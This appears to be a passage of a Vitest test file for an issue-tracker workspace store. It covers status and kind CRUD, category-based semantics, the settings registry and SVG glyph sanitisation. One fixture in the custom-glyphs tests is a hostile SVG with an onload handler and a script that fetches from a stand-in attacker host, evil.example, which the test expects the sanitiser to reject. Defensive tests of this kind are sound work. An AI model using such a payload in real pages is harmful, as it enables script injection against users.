import { beforeEach, describe, expect, it } from "vitest";
import { openDb } from "../src/core/db.js";
import { migrateWorkspace } from "../src/core/schema.js";
import { WorkspaceStore } from "../src/core/store.js";
import { sanitizeSvg } from "../src/core/svg-sanitize.js";
import { ISSUE_KINDS, ISSUE_STATUSES, StapleError } from "../src/core/types.js";

/**
 * O7a (STA-140) — the workspace vocabulary is DATA.
 *
 * Two claims are under test here and they are different in kind.
 *
 * The first is CRUD: statuses and kinds can be added, renamed, reordered and
 * removed, and removal is guarded twice over. That part is ordinary.
 *
 * The second is the one the ticket exists for, and it is the reason most of this
 * file is about issues rather than about settings rows: every semantic in the
 * store must key off a status's CATEGORY and off the configured ORDER, never off
 * a literal id. The way to prove that is not to read the source — it is to
 * RENAME EVERY BUILT-IN STATUS AWAY and then check that checkout, release,
 * derived parent rungs, resolved detection, the inbox partition and the list
 * order all still behave. If any of them had a string literal left in it, the
 * renamed workspace breaks and these tests go red.
 */

function memStore(): WorkspaceStore {
  const db = openDb(":memory:");
  migrateWorkspace(db);
  return new WorkspaceStore(db, "test", "TST");
}

let store: WorkspaceStore;
beforeEach(() => {
  store = memStore();
});

const idsOf = (rows: Array<{ id: string }>) => rows.map((r) => r.id);

// --------------------------------------------------------------------- seed

describe("the seeded vocabulary", () => {
  it("seeds exactly the built-in statuses, in seed order, with their categories", () => {
    expect(idsOf(store.getStatuses())).toEqual([...ISSUE_STATUSES]);
    expect(store.getStatuses().map((s) => `${s.id}:${s.category}`)).toEqual([
      "backlog:unstarted",
      "todo:ready",
      "in_progress:active",
      "in_review:review",
      "awaiting_approval:gated",
      "done:done",
      "blocked:blocked",
      "cancelled:cancelled",
    ]);
    expect(store.getStatuses().every((s) => s.isBuiltin)).toBe(true);
  });

  it("seeds the kind vocabulary O1a consumes", () => {
    expect(idsOf(store.getKinds())).toEqual([...ISSUE_KINDS]);
    expect(store.getKinds().every((k) => k.isBuiltin)).toBe(true);
  });

  /**
   * The fresh-create fast path executes a `sqlite_master` dump, which carries no
   * rows — so a database that took that path would come up with two empty tables
   * if `migrateWorkspace` did not seed after the runner. This is that assertion,
   * and it is the one that fails if somebody "simplifies" the double seed away.
   */
  it("seeds on the consolidated fresh-create path, not only on the walk", () => {
    const db = openDb(":memory:");
    migrateWorkspace(db);
    const counts = db
      .prepare(
        `SELECT (SELECT COUNT(*) FROM workspace_statuses) AS s,
                (SELECT COUNT(*) FROM workspace_kinds) AS k`,
      )
      .get() as { s: number; k: number };
    expect(counts).toEqual({ s: ISSUE_STATUSES.length, k: ISSUE_KINDS.length });
    db.close();
  });

  it("does not write a settings_revision row until something changes", () => {
    const keys = () =>
      (store.db.prepare("SELECT key FROM meta ORDER BY key").all() as Array<{ key: string }>).map(
        (r) => r.key,
      );
    expect(keys()).not.toContain("settings_revision");
    store.renameStatus("todo", "Ready");
    expect(keys()).toContain("settings_revision");
  });
});

// ---------------------------------------------------------------- CRUD

describe("editing statuses", () => {
  it("adds a status after a named one without renumbering the rest", () => {
    const before = store.getStatuses().map((s) => s.sortOrder);
    store.addStatus({ id: "needs_qa", category: "review", after: "in_review" });
    expect(idsOf(store.getStatuses())).toEqual([
      "backlog",
      "todo",
      "in_progress",
      "in_review",
      "needs_qa",
      "awaiting_approval",
      "done",
      "blocked",
      "cancelled",
    ]);
    // The pre-existing rows kept their sort_order — `after` is arithmetic in the
    // gap, not a rewrite of the column.
    expect(store.getStatuses().filter((s) => s.isBuiltin).map((s) => s.sortOrder)).toEqual(before);
  });

  it("appends when no --after is given, and title-cases a missing label", () => {
    store.addStatus({ id: "on_hold", category: "blocked" });
    const added = store.getStatuses().at(-1)!;
    expect(added).toMatchObject({ id: "on_hold", label: "On Hold", category: "blocked", isBuiltin: false });
  });

  it("refuses a duplicate id, an unusable id and an unknown category", () => {
    expect(() => store.addStatus({ id: "todo", category: "ready" })).toThrowError(/already exists/);
    expect(() => store.addStatus({ id: "Not Valid", category: "ready" })).toThrowError(/not a usable status id/);
    expect(() => store.addStatus({ id: "whatever", category: "purple" })).toThrowError(
      /Unknown status category/,
    );
  });

  it("renames the label and leaves the id — the thing every row references — alone", () => {
    store.renameStatus("in_progress", "Doing");
    expect(store.getStatuses().find((s) => s.id === "in_progress")?.label).toBe("Doing");
    expect(idsOf(store.getStatuses())).toEqual([...ISSUE_STATUSES]);
  });

  it("reorders, and refuses a partial or duplicated order rather than guessing", () => {
    store.reorderStatuses([
      "in_progress",
      "in_review",
      "awaiting_approval",
      "blocked",
      "todo",
      "backlog",
      "done",
      "cancelled",
    ]);
    expect(idsOf(store.getStatuses())).toEqual([
      "in_progress",
      "in_review",
      "awaiting_approval",
      "blocked",
      "todo",
      "backlog",
      "done",
      "cancelled",
    ]);
    expect(() => store.reorderStatuses(["todo", "backlog"])).toThrowError(/must list every status/);
    expect(() => store.reorderStatuses([...ISSUE_STATUSES, "todo"])).toThrowError(/appears twice/);
    expect(() => store.reorderStatuses([...ISSUE_STATUSES, "nope"])).toThrowError(/Unknown status/);
  });

  it("moves a status to another category, which is how you change its behaviour", () => {
    store.recategorizeStatus("in_review", "gated");
    expect(store.categoryOf("in_review")).toBe("gated");
  });
});

describe("removing a status", () => {
  it("removes an unused custom status cleanly", () => {
    store.addStatus({ id: "on_hold", category: "blocked" });
    expect(store.removeStatus("on_hold")).toEqual({ migrated: 0 });
    expect(idsOf(store.getStatuses())).toEqual([...ISSUE_STATUSES]);
  });

  it("refuses while issues still carry it, and names how many", () => {
    store.addStatus({ id: "on_hold", category: "blocked" });
    const issue = store.createIssue({ title: "parked" });
    store.updateIssue(issue.id, { status: "on_hold" });
    expect(() => store.removeStatus("on_hold")).toThrowError(/1 issue still has status "on_hold"/);
    // …and the status is still there: a refused remove writes nothing.
    expect(idsOf(store.getStatuses())).toContain("on_hold");
  });

  it("migrates every row that carried it when --migrate-to is given", () => {
    store.addStatus({ id: "on_hold", category: "blocked" });
    const a = store.createIssue({ title: "one" });
    const b = store.createIssue({ title: "two" });
    store.updateIssue(a.id, { status: "on_hold" });
    store.updateIssue(b.id, { status: "on_hold" });

    expect(store.removeStatus("on_hold", { migrateTo: "backlog" })).toEqual({ migrated: 2 });
    expect(store.getIssue(a.id).status).toBe("backlog");
    expect(store.getIssue(b.id).status).toBe("backlog");
    expect(idsOf(store.getStatuses())).not.toContain("on_hold");
  });

  /**
   * The guard that keeps the workspace COHERENT rather than merely tidy: staple
   * itself writes into these categories (checkout -> active, release -> ready,
   * done -> done), so emptying one leaves a workspace that cannot complete a task.
   * `review` and `gated` are absent from the required set on purpose — nothing
   * can enter a category with no members, so emptying those is a real choice.
   */
  it("refuses to empty a category the code writes into, even with --migrate-to", () => {
    for (const id of ["backlog", "todo", "in_progress", "blocked", "done", "cancelled"]) {
      expect(() => store.removeStatus(id, { migrateTo: "todo" }), id).toThrowError(
        /only status in the .* category/,
      );
    }
    // in_review is not required, so it goes.
    expect(() => store.removeStatus("in_review")).not.toThrow();
  });

  it("allows removing a required category's member while a sibling remains", () => {
    store.addStatus({ id: "queued", category: "ready", after: "todo" });
    expect(() => store.removeStatus("todo")).not.toThrow();
    expect(store.primaryStatusFor("ready")).toBe("queued");
  });
});

describe("editing kinds", () => {
  it("adds, renames, reorders and removes", () => {
    store.addKind({ id: "milestone" });
    expect(store.getKinds().at(-1)).toMatchObject({ id: "milestone", label: "Milestone", isBuiltin: false });
    store.renameKind("spike", "Spike / Research");
    expect(store.getKinds().find((k) => k.id === "spike")?.label).toBe("Spike / Research");
    store.reorderKinds(["task", "bug", "chore", "spike", "epic", "milestone"]);
    expect(idsOf(store.getKinds())).toEqual(["task", "bug", "chore", "spike", "epic", "milestone"]);
    expect(store.removeKind("milestone")).toEqual({ migrated: 0 });
    expect(idsOf(store.getKinds())).not.toContain("milestone");
  });

  /**
   * The counter O7a left probing for a column that did not exist yet. O1a
   * (STA-124) added `issues.kind`, so this now reads real rows — which is the
   * whole point of having written it as a probe rather than a hardcoded 0.
   */
  it("counts real kind usage now that issues carry a kind", () => {
    expect(store.kindUsageCount("task")).toBe(0);
    store.createIssue({ title: "anything" });
    expect(store.kindUsageCount("task")).toBe(1);
    store.createIssue({ title: "a defect", kind: "bug" });
    expect(store.kindUsageCount("task")).toBe(1);
    expect(store.kindUsageCount("bug")).toBe(1);
  });

  /**
   * The guard O7a wrote against a future it could not yet exercise: removing a
   * kind that rows still reference must refuse rather than orphan them.
   */
  it("refuses to remove a kind issues still carry, and migrates on request", () => {
    store.createIssue({ title: "a defect", kind: "bug" });
    expect(() => store.removeKind("bug")).toThrowError(/1 issue still has kind "bug"/);
    expect(store.removeKind("bug", { migrateTo: "chore" })).toEqual({ migrated: 1 });
    expect(store.kindUsageCount("chore")).toBe(1);
    expect(idsOf(store.getKinds())).not.toContain("bug");
  });

  it("keeps at least one kind", () => {
    for (const id of ["epic", "bug", "chore", "spike"]) store.removeKind(id);
    expect(() => store.removeKind("task")).toThrowError(/only kind left/);
  });

  it("has no categories, and says so instead of silently ignoring one", () => {
    expect(() => store.applyKindOps([{ op: "recategorize", id: "task", category: "ready" }])).toThrowError(
      /Kinds have no category/,
    );
  });
});

describe("batched ops", () => {
  it("applies in order, so a later op sees an earlier one's row", () => {
    const result = store.applyStatusOps([
      { op: "add", id: "second_signoff", category: "gated", after: "awaiting_approval" },
      { op: "rename", id: "second_signoff", label: "Waiting on a second human" },
    ]);
    expect(result.find((s) => s.id === "second_signoff")?.label).toBe(
      "Waiting on a second human",
    );
  });

  it("is all-or-nothing: a failing op undoes the ops before it", () => {
    expect(() =>
      store.applyStatusOps([
        { op: "add", id: "second_signoff", category: "gated" },
        { op: "add", id: "todo", category: "ready" }, // duplicate -> throws
      ]),
    ).toThrowError(/already exists/);
    expect(idsOf(store.getStatuses())).toEqual([...ISSUE_STATUSES]);
  });
});

// ------------------------------------------------------- the cache contract

describe("the settings cache", () => {
  it("serves a memo but never a stale one after another connection writes", () => {
    const db = openDb(":memory:");
    migrateWorkspace(db);
    const a = new WorkspaceStore(db, "test", "TST");
    const b = new WorkspaceStore(db, "test", "TST");

    // Warm both memos against the same file.
    expect(idsOf(a.getStatuses())).toEqual([...ISSUE_STATUSES]);
    expect(idsOf(b.getStatuses())).toEqual([...ISSUE_STATUSES]);

    a.addStatus({ id: "on_hold", category: "blocked" });

    // B never touched its own cache, and must still see the new row: the memo is
    // keyed on meta.settings_revision, not on "did I write".
    expect(idsOf(b.getStatuses())).toContain("on_hold");
    db.close();
  });
});

// ----------------------------------------------- semantics follow the config

/**
 * The workspace nothing in `store.ts` can have hardcoded: every built-in id is
 * gone, replaced by a same-category status under a different name. If a single
 * guard still compares against `"in_progress"`, `"done"` or `"awaiting_approval"`,
 * everything below fails.
 */
function renamedWorkspace(): WorkspaceStore {
  const s = memStore();
  s.applyStatusOps([
    { op: "add", id: "icebox", category: "unstarted" },
    { op: "add", id: "queued", category: "ready" },
    { op: "add", id: "doing", category: "active" },
    { op: "add", id: "reviewing", category: "review" },
    { op: "add", id: "signoff", category: "gated" },
    { op: "add", id: "shipped", category: "done" },
    { op: "add", id: "stuck", category: "blocked" },
    { op: "add", id: "dropped", category: "cancelled" },
    { op: "remove", id: "backlog", migrateTo: "icebox" },
    { op: "remove", id: "todo", migrateTo: "queued" },
    { op: "remove", id: "in_progress", migrateTo: "doing" },
    { op: "remove", id: "in_review", migrateTo: "reviewing" },
    { op: "remove", id: "awaiting_approval", migrateTo: "signoff" },
    { op: "remove", id: "done", migrateTo: "shipped" },
    { op: "remove", id: "blocked", migrateTo: "stuck" },
    { op: "remove", id: "cancelled", migrateTo: "dropped" },
    {
      op: "reorder",
      ids: ["icebox", "queued", "doing", "reviewing", "signoff", "shipped", "stuck", "dropped"],
    },
  ]);
  return s;
}

describe("every semantic keys off category, not off the built-in ids", () => {
  beforeEach(() => {
    store = renamedWorkspace();
  });

  it("creates into the configured unstarted/ready statuses", () => {
    expect(store.createIssue({ title: "unassigned" }).status).toBe("icebox");
    expect(store.createIssue({ title: "assigned", assignee: "a" }).status).toBe("queued");
  });

  it("claims into the configured active status and releases into the ready one", () => {
    const issue = store.createIssue({ title: "work" });
    expect(store.checkoutIssue(issue.id, "agent-a").status).toBe("doing");
    expect(store.claimActivity(issue.id)?.heldBy).toBe("agent-a");
    expect(store.releaseIssue(issue.id, "agent-a").status).toBe("queued");
  });

  it("claims from unstarted, ready and blocked — and refuses from review", () => {
    expect(store.checkoutExpectedStatuses()).toEqual(["queued", "icebox", "stuck"]);
    const parked = store.createIssue({ title: "parked", status: "stuck" });
    expect(store.checkoutIssue(parked.id, "agent-a").status).toBe("doing");

    const reviewing = store.createIssue({ title: "reviewing", status: "reviewing" });
    expect(() => store.checkoutIssue(reviewing.id, "agent-a")).toThrowError(/Checkout refused/);
  });

  it("treats the configured done/cancelled statuses as resolved", () => {
    expect(store.isResolvedStatus("shipped")).toBe(true);
    expect(store.isResolvedStatus("dropped")).toBe(true);
    expect(store.isResolvedStatus("stuck")).toBe(false);

    const blocker = store.createIssue({ title: "blocker" });
    const dependent = store.createIssue({ title: "dependent" });
    store.setBlockedBy(dependent.id, [blocker.id]);
    expect(store.unresolvedBlockersOf(dependent.id)).toHaveLength(1);
    store.updateIssue(blocker.id, { status: "shipped" });
    expect(store.unresolvedBlockersOf(dependent.id)).toHaveLength(0);
  });

  it("stamps completedAt/cancelledAt/startedAt by category", () => {
    const done = store.createIssue({ title: "d", assignee: "a" });
    store.updateIssue(done.id, { status: "shipped" });
    expect(store.getIssue(done.id).completedAt).not.toBeNull();

    const gone = store.createIssue({ title: "c" });
    store.updateIssue(gone.id, { status: "dropped" });
    expect(store.getIssue(gone.id).cancelledAt).not.toBeNull();

    const live = store.createIssue({ title: "l", assignee: "a" });
    store.updateIssue(live.id, { status: "doing" });
    expect(store.getIssue(live.id).startedAt).not.toBeNull();
  });

  it("still requires an assignee to enter the active category", () => {
    const issue = store.createIssue({ title: "work" });
    expect(() => store.updateIssue(issue.id, { status: "doing" })).toThrowError(/requires an assignee/);
  });

  it("derives a parent through the renamed ladder", () => {
    const epic = store.createIssue({ title: "epic" });
    const child = store.createIssue({ title: "child", parent: epic.id });

    // rung 3: an open unstarted child puts the epic in the workable band, and
    // the band writes the UNSTARTED status, never the ready one.
    expect(store.getIssue(epic.id).status).toBe("icebox");

    // rung 1: work starts underneath.
    store.checkoutIssue(child.id, "agent-a");
    expect(store.getIssue(epic.id).status).toBe("doing");

    // rung 2: review.
    store.updateIssue(child.id, { status: "reviewing" });
    expect(store.getIssue(epic.id).status).toBe("reviewing");

    // rung 4: everything open underneath is blocked.
    store.updateIssue(child.id, { status: "stuck" });
    expect(store.getIssue(epic.id).status).toBe("stuck");

    // rung 6: nothing open left, so the epic closes — into whatever this
    // workspace calls done, never into the literal `done`.
    store.updateIssue(child.id, { status: "shipped" });
    expect(store.getIssue(epic.id).status).toBe("shipped");
    expect(store.getIssue(epic.id).completedAt).not.toBeNull();

    // rung 5 is the same, in the workspace's own cancelled status.
    const other = store.createIssue({ title: "other epic" });
    const dropped = store.createIssue({ title: "dropped child", parent: other.id });
    store.updateIssue(dropped.id, { status: "dropped" });
    expect(store.getIssue(other.id).status).toBe("dropped");
  });

  /**
   * THREE buckets, and the split between the two not-ready ones is a CATEGORY
   * question (STA-143 x STA-140). `blocked` drains when other WORK lands;
   * `gated` drains when a PERSON answers, and an agent that cannot tell them
   * apart either nags a human about a dependency or waits for a human nobody
   * told. `signoff` is this workspace's gated status — nothing here names
   * `awaiting_approval`, which is the whole point of the block.
   */
  it("partitions the inbox by category: gated to queued, blocked to blocked", () => {
    const ready = store.createIssue({ title: "ready", status: "queued" });
    const parked = store.createIssue({ title: "parked", status: "stuck" });
    const gated = store.createIssue({ title: "gated", status: "signoff" });

    const inbox = store.inbox();
    expect(inbox.ready.map((i) => i.id)).toContain(ready.id);
    expect(inbox.blocked.map((i) => i.id)).toContain(parked.id);
    expect(inbox.queued.map((i) => i.id)).toContain(gated.id);
    expect(inbox.ready.map((i) => i.id)).not.toContain(gated.id);
    expect(inbox.blocked.map((i) => i.id)).not.toContain(gated.id);
  });

  it("counts children under the CONFIGURED status keys", () => {
    const epic = store.createIssue({ title: "epic" });
    store.createIssue({ title: "child", parent: epic.id, status: "queued" });
    const counts = store.timing(epic.id).childStatusCounts;
    expect(Object.keys(counts).sort()).toEqual(
      ["doing", "dropped", "icebox", "queued", "reviewing", "shipped", "signoff", "stuck"].sort(),
    );
    expect(counts.queued).toBe(1);
  });

  it("rejects a status the workspace does not configure", () => {
    expect(() => store.createIssue({ title: "x", status: "in_progress" })).toThrowError(
      /Unknown status "in_progress"/,
    );
  });
});

describe("configured order drives the list", () => {
  it("sorts by category tier first, and by configured order within a tier", () => {
    // Two READY statuses. Their relative order is configuration; their position
    // below `active` is not, and a reorder must not be able to change it.
    store.addStatus({ id: "queued", category: "ready", after: "todo" });
    const later = store.createIssue({ title: "later", status: "queued" });
    const soon = store.createIssue({ title: "soon", status: "todo" });
    const live = store.createIssue({ title: "live", assignee: "a", status: "todo" });
    store.checkoutIssue(live.id, "a");

    const order = () => store.listIssues().map((i) => i.id);
    expect(order()).toEqual([live.id, soon.id, later.id]);

    // Flip the two ready statuses; the ready pair swaps, `active` stays on top.
    store.reorderStatuses([
      "backlog",
      "queued",
      "todo",
      "in_progress",
      "in_review",
      "awaiting_approval",
      "done",
      "blocked",
      "cancelled",
    ]);
    expect(order()).toEqual([live.id, later.id, soon.id]);
  });

  it("exposes the pickup and open orders it sorted by", () => {
    // `gated` is absent from the PICKUP order and present in the OPEN one — the
    // whole of "a parked parent is open work that nobody may pick up", in two lists.
    expect(store.inboxPickupOrder()).toEqual(["in_progress", "in_review", "todo", "backlog"]);
    expect(store.openStatusOrder()).toEqual([
      "in_progress",
      "in_review",
      "awaiting_approval",
      "blocked",
      "todo",
      "backlog",
    ]);
    store.addStatus({ id: "second_signoff", category: "gated" });
    // A SECOND gated status joins the same tier, after the one already there:
    // `gated` sits between review and blocked, parked but not yet a dependency.
    expect(store.openStatusOrder()).toEqual([
      "in_progress",
      "in_review",
      "awaiting_approval",
      "second_signoff",
      "blocked",
      "todo",
      "backlog",
    ]);
  });
});

// --------------------------------------------------- registered values (R6a, STA-176)

describe("registered workspace settings", () => {
  const metaRows = () =>
    (store.db.prepare("SELECT key, value FROM meta WHERE key LIKE 'setting:%' ORDER BY key").all() as Array<{
      key: string;
      value: string;
    }>);

  it("answers the definition's default with source default until something is stored", () => {
    expect(store.getSetting("kinds.default")).toBe("task");
    expect(store.settingValues()).toEqual([
      { key: "kinds.default", scope: "workspace", value: "task", source: "default", version: 1 },
      { key: "kinds.appearance", scope: "workspace", value: {}, source: "default", version: 1 },
    ]);
    // Nothing is written by a read — the fresh-workspace meta table stays exactly as seeded.
    expect(metaRows()).toEqual([]);
  });

  it("persists a set value as one versioned meta row and reports it with source workspace", () => {
    const view = store.setSetting("kinds.default", "bug", "op");
    expect(view).toEqual({ key: "kinds.default", scope: "workspace", value: "bug", source: "workspace", version: 1 });
    expect(metaRows()).toEqual([{ key: "setting:kinds.default", value: JSON.stringify({ v: 1, value: "bug" }) }]);
    expect(store.getSetting("kinds.default")).toBe("bug");
  });

  it("is honoured by defaultKind(), so a create with no kind writes the chosen one", () => {
    store.setSetting("kinds.default", "bug");
    expect(store.defaultKind()).toBe("bug");
    expect(store.createIssue({ title: "No kind given" }).kind).toBe("bug");
  });

  it("validates at the write boundary: shape from the registry, existence from the store", () => {
    expect(() => store.setSetting("kinds.default", 7)).toThrow(/"kinds\.default" must be a kind id/);
    expect(() => store.setSetting("kinds.default", "Not-A-Kind")).toThrow(/"kinds\.default" must be a kind id/);
    expect(() => store.setSetting("kinds.default", "milestone")).toThrow(/Unknown kind "milestone"/);
    expect(metaRows()).toEqual([]);
  });

  it("refuses a global key on the workspace surface, pointing at `staple config set`", () => {
    expect(() => store.setSetting("machine.port", 4500)).toThrow(
      /"machine\.port" is a global setting, not a workspace one\. Global settings are edited with `staple config set`/,
    );
    expect(() => store.getSetting("machine.port")).toThrow(StapleError);
    expect(() => store.getSetting("nothing.here")).toThrow(/Unknown workspace setting "nothing\.here"/);
  });

  it("validates at the read boundary: a stored value that no longer fits is refused by key", () => {
    store.db
      .prepare("INSERT INTO meta (key, value) VALUES ('setting:kinds.default', ?)")
      .run(JSON.stringify({ v: 1, value: 42 }));
    expect(() => store.getSetting("kinds.default")).toThrow(/workspace test: "kinds\.default" must be a kind id/);
  });

  it("refuses a value written at a newer version rather than reinterpreting it", () => {
    store.db
      .prepare("INSERT INTO meta (key, value) VALUES ('setting:kinds.default', ?)")
      .run(JSON.stringify({ v: 2, value: "bug" }));
    expect(() => store.settingValues()).toThrow(/"kinds\.default" was written by a newer staple/);
  });

  it("preserves and reports a stored key it has no definition for, and never rewrites it", () => {
    store.db
      .prepare("INSERT INTO meta (key, value) VALUES ('setting:future.flag', ?)")
      .run(JSON.stringify({ v: 3, value: { anything: true } }));
    expect(store.unknownSettingKeys()).toEqual(["future.flag"]);
    expect(store.settingValues().map((v) => v.key)).toEqual(["kinds.default", "kinds.appearance"]);
    store.setSetting("kinds.default", "bug");
    store.resetSetting("kinds.default");
    expect(metaRows()).toEqual([
      { key: "setting:future.flag", value: JSON.stringify({ v: 3, value: { anything: true } }) },
    ]);
  });

  it("reset deletes the row so the default applies again, and is a no-op when nothing is stored", () => {
    store.setSetting("kinds.default", "bug");
    expect(store.resetSetting("kinds.default").source).toBe("default");
    expect(metaRows()).toEqual([]);
    expect(store.defaultKind()).toBe("task");
    const before = store.db.prepare("SELECT COUNT(*) AS n FROM events").get() as { n: number };
    store.resetSetting("kinds.default");
    expect((store.db.prepare("SELECT COUNT(*) AS n FROM events").get() as { n: number }).n).toBe(before.n);
  });

  it("records actor, previous value and new value on every change", () => {
    store.setSetting("kinds.default", "bug", "alice");
    store.resetSetting("kinds.default", "bob");
    const rows = store.db
      .prepare("SELECT actor, payload FROM events WHERE kind = 'setting_changed' ORDER BY seq")
      .all() as Array<{ actor: string; payload: string }>;
    expect(rows.map((r) => [r.actor, JSON.parse(r.payload)])).toEqual([
      ["alice", { action: "set", key: "kinds.default", from: "task", to: "bug" }],
      ["bob", { action: "reset", key: "kinds.default", from: "bug", to: "task" }],
    ]);
  });

  it("bumps the settings revision so another connection's snapshot goes stale", () => {
    const other = new WorkspaceStore(store.db, "test", "TST");
    expect(other.getSetting("kinds.default")).toBe("task");
    store.setSetting("kinds.default", "bug");
    expect(other.getSetting("kinds.default")).toBe("bug");
  });

  it("resets a default that names a removed kind in the same transaction", () => {
    store.setSetting("kinds.default", "bug");
    store.removeKind("bug");
    expect(store.getSetting("kinds.default")).toBe("task");
    expect(metaRows()).toEqual([]);
    expect(store.defaultKind()).toBe("task");
  });

  it("applies a batch in order, all or nothing", () => {
    expect(() =>
      store.applySettingOps([
        { op: "set", key: "kinds.default", value: "bug" },
        { op: "set", key: "kinds.default", value: "nope_not_configured" },
      ]),
    ).toThrow(/Unknown kind/);
    expect(store.getSetting("kinds.default")).toBe("task");
    expect(store.applySettingOps([{ op: "set", key: "kinds.default", value: "spike" }])).toEqual([
      { key: "kinds.default", scope: "workspace", value: "spike", source: "workspace", version: 1 },
      { key: "kinds.appearance", scope: "workspace", value: {}, source: "default", version: 1 },
    ]);
    expect(() => store.applySettingOps([{ op: "bogus", key: "kinds.default" } as never])).toThrow(
      /Unknown setting op "bogus"/,
    );
  });
});

// ------------------------------------------------------- kind appearance (R5a, STA-181)

describe("kind appearance", () => {
  const metaRows = () =>
    (store.db.prepare("SELECT key, value FROM meta WHERE key LIKE 'setting:%' ORDER BY key").all() as Array<{
      key: string;
      value: string;
    }>);
  const flask = { source: "lucide", value: "flask-conical", fallback: "⚗" } as const;

  it("resolves every seeded kind to its built-in mark with the configured label, storing nothing", () => {
    const rows = store.getKindsWithAppearance();
    expect(rows.map((k) => k.id)).toEqual(idsOf(store.getKinds()));
    expect(rows.map((k) => `${k.id}:${k.appearance.source}:${k.appearance.value}:${k.appearance.fallback}`)).toEqual([
      "epic:lucide:layers:◆",
      "task:lucide:square-check:◇",
      "bug:lucide:bug:✱",
      "chore:lucide:wrench:↻",
      "spike:lucide:zap:↯",
    ]);
    expect(rows.map((k) => k.appearance.label)).toEqual(["Epic", "Task", "Bug", "Chore", "Spike"]);
    expect(store.kindAppearance("epic")).toEqual(rows[0]!.appearance);
    expect(metaRows()).toEqual([]);
    expect(store.settingValues().find((v) => v.key === "kinds.appearance")).toEqual({
      key: "kinds.appearance",
      scope: "workspace",
      value: {},
      source: "default",
      version: 1,
    });
  });

  it("gives a custom kind the generic mark until it is given one, and a renamed kind its new label", () => {
    store.addKind({ id: "research" });
    expect(store.kindAppearance("research")).toEqual({ source: "none", value: "", label: "Research", fallback: "•" });
    store.renameKind("spike", "Investigation");
    expect(store.kindAppearance("spike")).toEqual({ source: "lucide", value: "zap", label: "Investigation", fallback: "↯" });
    // Total: an id nobody configured still answers, with a title-cased label.
    expect(store.kindAppearance("not_here")).toEqual({ source: "none", value: "", label: "Not Here", fallback: "•" });
  });

  it("persists a stored choice as one versioned meta row and resolves it on every read", () => {
    store.addKind({ id: "research" });
    store.setSetting("kinds.appearance", { research: flask }, "op");
    expect(metaRows()).toEqual([
      { key: "setting:kinds.appearance", value: JSON.stringify({ v: 1, value: { research: flask } }) },
    ]);
    expect(store.kindAppearance("research")).toEqual({ ...flask, label: "Research" });
    expect(store.getKindsWithAppearance().find((k) => k.id === "research")!.appearance).toEqual({ ...flask, label: "Research" });
    // Everything else keeps its built-in mark.
    expect(store.kindAppearance("bug").value).toBe("bug");
  });

  it("uses a stored label when there is one, and the kind's own label when it is empty", () => {
    store.setSetting("kinds.appearance", { epic: { source: "emoji", value: "🚀", fallback: "E", label: "Initiative" } });
    expect(store.kindAppearance("epic")).toEqual({ source: "emoji", value: "🚀", label: "Initiative", fallback: "E" });
    store.setSetting("kinds.appearance", { epic: { source: "emoji", value: "🚀", fallback: "E", label: "" } });
    expect(store.kindAppearance("epic").label).toBe("Epic");
    store.renameKind("epic", "Programme");
    expect(store.kindAppearance("epic").label).toBe("Programme");
  });

  it("refuses at the write boundary: a colour, custom SVG, a bad key, and an unconfigured kind", () => {
    expect(() => store.setSetting("kinds.appearance", { epic: { ...flask, color: "#f00" } })).toThrow(
      /"kinds\.appearance" must be an appearance record without "color"/,
    );
    expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: "<svg/>", fallback: "s" } })).toThrow(
      /viewBox/,
    );
    expect(() => store.setSetting("kinds.appearance", { epic: { ...flask, value: "Not A Key" } })).toThrow(
      /Lucide icon key .* for "epic"/,
    );
    expect(() => store.setSetting("kinds.appearance", { milestone: flask })).toThrow(/Unknown kind "milestone"/);
    expect(() => store.setSetting("kinds.appearance", [])).toThrow(/a map of kind id/);
    expect(metaRows()).toEqual([]);
  });

  it("prunes a removed kind's entry in the same transaction, and clears the row when it was the last", () => {
    store.addKind({ id: "research" });
    store.setSetting("kinds.appearance", { research: flask, spike: { source: "none", value: "", fallback: "s" } });
    store.removeKind("research");
    expect(store.getSetting("kinds.appearance")).toEqual({ spike: { source: "none", value: "", fallback: "s" } });
    store.removeKind("spike");
    expect(store.getSetting("kinds.appearance")).toEqual({});
    expect(metaRows()).toEqual([]);
  });

  it("is validated at the read boundary like every registered value", () => {
    store.db
      .prepare("INSERT INTO meta (key, value) VALUES ('setting:kinds.appearance', ?)")
      .run(JSON.stringify({ v: 1, value: { epic: { source: "lucide" } } }));
    expect(() => store.getKindsWithAppearance()).toThrow(/workspace test: "kinds\.appearance" must be/);
  });
});

// ------------------------------------------------------- custom glyphs (R5c, STA-183)

describe("custom glyphs", () => {
  const metaRows = () =>
    (store.db.prepare("SELECT value FROM meta WHERE key = 'setting:kinds.appearance'").all() as Array<{ value: string }>).map(
      (row) => row.value,
    );
  const raw = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M4 2h16v20H4z" fill="#f00"/></svg>';
  const hostile = '<svg viewBox="0 0 24 24" onload="alert(1)"><script>fetch("https://evil.example")</script><path d="M0 0"/></svg>';
  const canonical = () => {
    const result = sanitizeSvg(raw, { label: "Box" });
    if (!result.ok) throw new Error(result.problem);
    return result.svg;
  };

  it("stores the sanitiser's canonical output and resolves it on every read, never the raw document", () => {
    store.setSetting("kinds.appearance", { epic: { source: "svg", value: canonical(), fallback: "▣" } }, "op");
    expect(store.kindAppearance("epic")).toEqual({ source: "svg", value: canonical(), label: "Epic", fallback: "▣" });
    expect(store.getKindsWithAppearance().find((k) => k.id === "epic")!.appearance.value).toBe(canonical());
    // What sits on disk is the canonical string: no width/height, currentColor, one title.
    const onDisk = (JSON.parse(metaRows()[0]!) as { value: { epic: { value: string } } }).value.epic.value;
    expect(onDisk).toBe(canonical());
    expect(onDisk).toContain('fill="currentColor"');
    expect(onDisk).not.toMatch(/width=|#f00/);
    expect(onDisk).toContain("<title>Box</title>");
  });

  it("refuses a raw or hostile document at the write boundary, and no markup reaches disk", () => {
    expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: raw, fallback: "s", label: "Box" } })).toThrow(
      /"kinds\.appearance" must be the sanitiser's canonical SVG for value .* for "epic"/,
    );
    expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: hostile, fallback: "s" } })).toThrow(
      /must be an SVG without <script> elements for value/,
    );
    expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: "<svg>" + "a".repeat(1024 * 1024), fallback: "s" } })).toThrow(
      /at most 8192 bytes/,
    );
    expect(() => store.setSetting("kinds.appearance", { epic: { source: "emoji", value: "🚀🚀🚀", fallback: "e" } })).toThrow(
      /1 to 2 visible characters/,
    );
